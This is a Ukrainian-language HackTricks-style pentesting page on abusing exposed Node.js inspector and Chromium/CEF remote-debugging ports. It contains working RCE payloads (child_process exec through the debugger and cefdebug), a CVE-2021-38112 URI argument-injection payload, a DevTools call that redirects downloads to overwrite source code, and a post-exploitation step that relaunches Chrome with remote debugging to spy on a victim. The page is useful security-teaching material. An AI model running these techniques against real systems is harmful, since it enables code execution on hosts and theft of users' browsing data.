# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Коли процес Node.js запускається з параметром `--inspect`, він слухає клієнта для налагодження. За **замовчуванням** він буде слухати на хості та порту **`127.0.0.1:9229`**. Кожному процесу також присвоюється **унікальний** **UUID**.

Клієнти інспектора повинні знати та вказати адресу хоста, порт і UUID для підключення. Повна URL-адреса виглядатиме приблизно так: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Оскільки **налагоджувач має повний доступ до середовища виконання Node.js**, зловмисник, який зможе підключитися до цього порту, може виконати довільний код від імені процесу Node.js (**потенційне підвищення привілеїв**).

Існує кілька способів запустити інспектор:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Коли ви запускаєте процес, що перевіряється, з'явиться щось подібне:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Процеси, засновані на **CEF** (**Chromium Embedded Framework**), повинні використовувати параметр: `--remote-debugging-port=9222`, щоб відкрити **debugger** (заходи захисту від SSRF залишаються дуже схожими). Однак, вони **замість** надання сесії **NodeJS** **debug** спілкуватимуться з браузером, використовуючи [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), це інтерфейс для керування браузером, але немає прямого RCE.

Коли ви запускаєте налагоджений браузер, з'явиться щось подібне:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Браузери, WebSockets та політика однакового походження <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Вебсайти, відкриті в веб-браузері, можуть здійснювати запити WebSocket та HTTP відповідно до моделі безпеки браузера. **Початкове HTTP з'єднання** необхідне для **отримання унікального ідентифікатора сесії налагодження**. **Політика однакового походження** **запобігає** вебсайтам можливості здійснювати **це HTTP з'єднання**. Для додаткової безпеки проти [**атак повторного зв'язування DNS**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js перевіряє, що **заголовки 'Host'** для з'єднання або вказують на **IP-адресу**, або **`localhost`**, або **`localhost6`** точно.

> [!NOTE]
> Ці **заходи безпеки запобігають використанню інспектора** для виконання коду, **просто відправляючи HTTP запит** (що могло б бути зроблено шляхом експлуатації вразливості SSRF).

### Запуск інспектора в працюючих процесах

Ви можете надіслати **сигнал SIGUSR1** працюючому процесу nodejs, щоб змусити його **запустити інспектора** на порту за замовчуванням. Однак зверніть увагу, що вам потрібно мати достатні привілеї, тому це може надати вам **привілейований доступ до інформації всередині процесу**, але не призведе до прямого підвищення привілеїв.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!NOTE]
> Це корисно в контейнерах, оскільки **зупинка процесу та запуск нового** з `--inspect` **не є варіантом**, оскільки **контейнер** буде **вбито** разом з процесом.

### Підключення до інспектора/дебагера

Щоб підключитися до **браузера на основі Chromium**, можна отримати доступ до URL-адрес `chrome://inspect` або `edge://inspect` для Chrome або Edge відповідно. Натиснувши кнопку Налаштування, слід переконатися, що **цільовий хост і порт** правильно вказані. Зображення показує приклад віддаленого виконання коду (RCE):

![](<../../images/image (674).png>)

Використовуючи **командний рядок**, ви можете підключитися до дебагера/інспектора за допомогою:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Інструмент [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) дозволяє **знайти інспектори**, що працюють локально, та **впровадити код** у них.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!NOTE]
> Зверніть увагу, що **вразливості RCE в NodeJS не працюватимуть**, якщо підключені до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (вам потрібно перевірити API, щоб знайти цікаві речі для роботи з ним).

## RCE в NodeJS Debugger/Inspector

> [!NOTE]
> Якщо ви прийшли сюди, шукаючи, як отримати [**RCE з XSS в Electron, будь ласка, перевірте цю сторінку.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)

Деякі поширені способи отримання **RCE**, коли ви можете **підключитися** до Node **інспектора**, це використання чогось на зразок (схоже, що це **не спрацює при підключенні до Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Ви можете перевірити API тут: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
У цьому розділі я просто перерахую цікаві речі, які, як я вважаю, люди використовували для експлуатації цього протоколу.

### Впровадження параметрів через глибокі посилання

У [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) компанія Rhino Security виявила, що програма на основі CEF **зареєструвала власний UR**I в системі (workspaces://), який отримував повний URI, а потім **запускала програму на основі CEF** з конфігурацією, що частково формувалася з цього URI.

Було виявлено, що параметри URI декодувалися з URL і використовувалися для запуску базової програми CEF, що дозволяло користувачу **впроваджувати** прапорець **`--gpu-launcher`** у **командний рядок** і виконувати довільні команди.

Отже, корисне навантаження, як:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Виконає calc.exe.

### Перезапис файлів

Змініть папку, куди **завантажені файли будуть збережені**, і завантажте файл, щоб **перезаписати** часто використовуваний **джерельний код** програми вашим **шкідливим кодом**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE та ексфільтрація

Згідно з цим постом: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) можливо отримати RCE та ексфільтрувати внутрішні сторінки з theriver.

### Пост-експлуатація

В реальному середовищі та **після компрометації** ПК користувача, який використовує браузер на базі Chrome/Chromium, ви можете запустити процес Chrome з **активованим налагодженням та переадресувати порт налагодження**, щоб мати до нього доступ. Таким чином, ви зможете **перевіряти все, що жертва робить з Chrome, і красти чутливу інформацію**.

Схований спосіб полягає в тому, щоб **завершити кожен процес Chrome** і потім викликати щось на зразок
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Посилання

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
